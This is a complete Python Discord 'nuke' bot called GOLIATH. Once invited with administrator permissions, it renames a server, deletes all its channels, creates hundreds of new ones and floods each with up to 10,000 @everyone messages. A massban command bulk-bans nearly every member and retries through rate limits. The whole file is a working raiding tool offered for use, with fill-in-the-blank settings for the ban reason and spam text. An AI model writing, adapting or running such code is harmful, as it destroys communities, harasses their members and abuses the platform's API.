# ty andrew but dont yap
import subprocess,sys
for p in ['aiohttp','discord.py','pystyle','pyfiglet']:
 try:__import__(p if p!='discord.py' else 'discord')
 except ImportError:subprocess.check_call([sys.executable,'-m','pip','install',p])
import asyncio,random,aiohttp,discord
from discord.ext import commands
from pystyle import Colorate,Colors,Center
import pyfiglet

intents = discord.Intents.all()
TOKEN = "TOKEN HERE"
GOLIATH = commands.AutoShardedBot(command_prefix='$', shard_count=1, intents=intents)
CHANNEL_NAMES = ["input", "your", "channels", "names", "formatted", "like", "this"]
MESSAGE_CONTENT = """@everyone Your non-embed message content here"""
EMBED_TITLE = "Your embed title here"
EMBED_DESCRIPTION = "Desc here"
EMBED_FOOTER = "Footer here"
EMBED_THUMBNAIL = "https://cdn.discordapp.com/attachments/1327921469552070746/1338112843660394556/chudjak-chud.gif?ex=67ce2772&is=67ccd5f2&hm=396c1be63f785bdbf5bad1254a4db10c3ad23d5137ecb1d29de0da7bb056fcc6&"
BAN_REASON = "Ur ban reason here"
SERVER_NAME = "Ur server name here"

def log(m,c=Colors.red):print(Colorate.Color(c,m,True))

@GOLIATH.event
async def on_ready():
    Banner = '''
═══════════════════════════════════════════════════════════════════════════════
  ▄▄█▀▀▀█▄█  ▄▄█▀▀██▄ ▀████▀    ▀████▀     ██     ███▀▀██▀▀███████▀  ▀████▀▀
▄██▀     ▀█▄██▀    ▀██▄ ██        ██      ▄██▄    █▀   ██   ▀█ ██      ██   
██▀       ▀██▀      ▀██ ██        ██     ▄█▀██▄        ██      ██      ██   
██         ██        ██ ██        ██    ▄█  ▀██        ██      ██████████   
██▄    ▀█████▄      ▄██ ██     ▄  ██    ████████       ██      ██      ██   
▀██▄     ██▀██▄    ▄██▀ ██    ▄█  ██   █▀      ██      ██      ██      ██   
  ▀▀███████  ▀▀████▀▀ ███████████ ███▄███▄   ▄████▄  ▄████▄  ▄████▄  ▄████▄▄
═══════════════════════════════════════════════════════════════════════════════
'''
    bot_info = f'''
[+] Username: {GOLIATH.user.name}
[+] User ID: {GOLIATH.user.id}
[+] Scope: https://discord.com/oauth2/authorize?client_id={GOLIATH.user.id}&scope=bot&permissions=8
[+] Guilds: {len(GOLIATH.guilds)}
[+] Author : Lambdaist & Aethernus
'''

    print(Colorate.Color(Colors.red, Banner, True))
    print(Colorate.Color(Colors.red, bot_info, True))

@GOLIATH.command()
async def nuke(ctx):
    await ctx.message.delete()
    try:await ctx.guild.edit(name=SERVER_NAME)
    except discord.Forbidden:
        await ctx.send("Missing permission to change guild name.",delete_after=5)
        log("Failed to change guild name.",Colors.red)
    async def delete_channels():
        tasks=[ch.delete() for ch in ctx.guild.channels]
        results=await asyncio.gather(*tasks,return_exceptions=True)
        for ch,res in zip(ctx.guild.channels,results):
            if isinstance(res,Exception):log(f"Failed to delete channel {ch.name}: {res}",Colors.red)
            else:log(f"Deleted channel {ch.name}",Colors.red)
    async def create_channels():
        tasks=[ctx.guild.create_text_channel(name) for _ in range(50) for name in random.sample(CHANNEL_NAMES,len(CHANNEL_NAMES))]
        results=await asyncio.gather(*tasks,return_exceptions=True)
        for name,res in zip([name for _ in range(50) for name in CHANNEL_NAMES],results):
            if isinstance(res,Exception):log(f"Failed to create channel {name}: {res}",Colors.red)
            else:log(f"Created channel {name}",Colors.green)
    await asyncio.gather(delete_channels(),create_channels())

@GOLIATH.event
async def on_guild_channel_create(channel):
    embed=discord.Embed(title=EMBED_TITLE,description=EMBED_DESCRIPTION,color=discord.Color.dark_red())
    embed.set_footer(text=EMBED_FOOTER)
    embed.set_thumbnail(url=EMBED_THUMBNAIL)
    headers={"Authorization":f"Bot {TOKEN}"}
    async with aiohttp.ClientSession() as session:
        for _ in range(10000):
            try:
                async with session.post(f"https://discord.com/api/v9/channels/{channel.id}/messages",json={"content":MESSAGE_CONTENT,"embed":embed.to_dict()},headers=headers) as r:
                    if r.status==200:log(f"Message sent to {channel.name}",Colors.green)
                    else:log(f"Failed to send message to {channel.name} - {r.status}",Colors.red)
            except Exception as e:log(f"Error sending message: {e}",Colors.red)
            await asyncio.sleep(1.2)

async def bulk_ban(ctx,reason):
    bot_member=ctx.guild.get_member(ctx.bot.user.id)
    user_ids=[str(m.id) for m in ctx.guild.members if m.id not in (ctx.author.id,ctx.guild.owner_id,bot_member.id)]
    if not user_ids:
        await ctx.send("No users to ban after filtering.",delete_after=5)
        return
    url=f"https://discord.com/api/v10/guilds/{ctx.guild.id}/bulk-ban"
    payload={"user_ids":user_ids,"reason":reason}
    headers={"Authorization":f"Bot {ctx.bot.http.token}","Content-Type":"application/json"}
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.post(url,json=payload,headers=headers) as r:
                if r.status==204:
                    await ctx.send(f"Bulk banned {len(user_ids)} members successfully.",delete_after=10)
                    log(f"Bulk ban succeeded: {len(user_ids)} members banned.",Colors.green)
                    break
                elif r.status==429:
                    retry_after=(await r.json()).get("retry_after",5)
                    log(f"Rate limited, retrying in {retry_after}s...",Colors.yellow)
                    await asyncio.sleep(retry_after)
                else:
                    err=await r.text()
                    await ctx.send(f"Bulk ban failed: {r.status} - {err}",delete_after=10)
                    log(f"Bulk ban failed: {r.status} - {err}",Colors.red)
                    break

@GOLIATH.command()
async def massban(ctx):await bulk_ban(ctx,BAN_REASON)

if __name__=="__main__":GOLIATH.run(TOKEN)
